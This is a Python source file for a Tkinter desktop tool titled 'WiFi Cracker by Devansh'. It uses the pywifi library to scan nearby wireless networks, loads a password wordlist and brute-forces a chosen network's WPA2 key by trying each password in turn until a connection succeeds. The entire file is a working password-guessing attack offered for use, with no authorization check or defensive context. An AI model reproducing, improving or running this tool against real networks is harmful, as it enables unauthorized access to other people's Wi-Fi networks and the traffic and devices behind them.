import tkinter as tk
from tkinter import filedialog, messagebox, scrolledtext
import pywifi
from pywifi import const
import time
import threading
import os

class WiFiCrackerGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("🔥 WiFi Cracker by Devansh 🔐")
        self.root.geometry("600x600")
        self.root.resizable(False, False)

        self.wifi = pywifi.PyWiFi()
        self.iface = self.wifi.interfaces()[0]
        self.networks = []
        self.wordlist_path = ""
        self.passwords = []
        self.attempts = 0

        title = tk.Label(root, text="WiFi Cracker by Devansh", font=("Arial", 20, "bold"), fg="#1e90ff")
        title.pack(pady=10)

        self.scan_btn = tk.Button(root, text="🔍 Scan WiFi Networks", command=self.scan_networks)
        self.scan_btn.pack(pady=5)

        self.network_listbox = tk.Listbox(root, width=50, height=6)
        self.network_listbox.pack(pady=5)

        self.wordlist_btn = tk.Button(root, text="📂 Load Wordlist (.txt)", command=self.load_wordlist)
        self.wordlist_btn.pack(pady=5)

        self.wordlist_label = tk.Label(root, text="Wordlist: Not selected", fg="grey")
        self.wordlist_label.pack(pady=2)

        self.total_label = tk.Label(root, text="Total Passwords: 0 | Tried: 0", fg="blue")
        self.total_label.pack(pady=2)

        self.start_btn = tk.Button(root, text="🚀 Start Cracking", bg="green", fg="white", command=self.start_cracking)
        self.start_btn.pack(pady=10)

        self.clear_btn = tk.Button(root, text="🧹 Clear Logs", command=self.clear_logs)
        self.clear_btn.pack()

        self.status_label = tk.Label(root, text="Status: Waiting...", fg="black")
        self.status_label.pack(pady=5)

        self.log_box = scrolledtext.ScrolledText(root, width=70, height=15, font=("Consolas", 10))
        self.log_box.pack(pady=10)
        self.log_box.insert(tk.END, "[Log] Waiting to start...\n")

    def log(self, message):
        self.log_box.insert(tk.END, message + '\n')
        self.log_box.see(tk.END)

    def clear_logs(self):
        self.log_box.delete(1.0, tk.END)
        self.log("[Log] Cleared")

    def scan_networks(self):
        self.status_label.config(text="Status: Scanning WiFi...")
        self.iface.scan()
        time.sleep(2)
        results = self.iface.scan_results()

        seen = set()
        self.networks.clear()
        self.network_listbox.delete(0, tk.END)

        for net in results:
            if net.ssid and net.ssid not in seen:
                seen.add(net.ssid)
                self.networks.append(net)
                self.network_listbox.insert(tk.END, net.ssid)

        self.status_label.config(text=f"Status: Found {len(self.networks)} network(s)")
        self.log(f"[Log] Scanned {len(self.networks)} networks.")

    def load_wordlist(self):
        path = filedialog.askopenfilename(filetypes=[("Text Files", "*.txt")])
        if path:
            self.wordlist_path = path
            self.wordlist_label.config(text=f"Wordlist: {path}")
            try:
                with open(path, 'r', errors='ignore') as f:
                    self.passwords = [line.strip() for line in f if line.strip()]
                self.total_label.config(text=f"Total Passwords: {len(self.passwords)} | Tried: 0")
                self.log(f"[Log] Loaded {len(self.passwords)} passwords from {os.path.basename(path)}")
            except:
                messagebox.showerror("Error", "Failed to load wordlist file.")
                self.passwords = []

    def try_password(self, ssid, password):
        profile = pywifi.Profile()
        profile.ssid = ssid
        profile.auth = const.AUTH_ALG_OPEN
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        profile.cipher = const.CIPHER_TYPE_CCMP
        profile.key = password

        self.iface.remove_all_network_profiles()
        test_profile = self.iface.add_network_profile(profile)

        self.iface.connect(test_profile)
        time.sleep(1.5)

        if self.iface.status() == const.IFACE_CONNECTED:
            self.iface.disconnect()
            return True
        return False

    def start_cracking(self):
        selected = self.network_listbox.curselection()
        if not selected:
            messagebox.showwarning("⚠️ No Network Selected", "Please select a WiFi network.")
            return
        if not self.passwords:
            messagebox.showwarning("⚠️ No Wordlist", "Please load a password list.")
            return

        ssid = self.network_listbox.get(selected[0])
        self.status_label.config(text=f"Cracking '{ssid}'...")
        self.attempts = 0
        self.log(f"[Start] Cracking WiFi: {ssid}")
        threading.Thread(target=self.crack_password, args=(ssid,), daemon=True).start()

    def crack_password(self, ssid):
        for pwd in self.passwords:
            self.attempts += 1
            self.total_label.config(text=f"Total Passwords: {len(self.passwords)} | Tried: {self.attempts}")
            self.status_label.config(text=f"Trying: {pwd}")
            self.log(f"[Try #{self.attempts}] {pwd}")
            self.root.update_idletasks()

            if self.try_password(ssid, pwd):
                self.status_label.config(text=f"✅ Password Found: {pwd}")
                self.log(f"[SUCCESS] Password for '{ssid}': {pwd}")
                messagebox.showinfo("Success", f"Password Found:\n\n{pwd}")
                return

        self.status_label.config(text="❌ Password Not Found.")
        self.log("[FAILED] Password not found in wordlist.")
        messagebox.showerror("Failed", "Password not found in wordlist.")

if __name__ == "__main__":
    root = tk.Tk()
    app = WiFiCrackerGUI(root)
    root.mainloop()
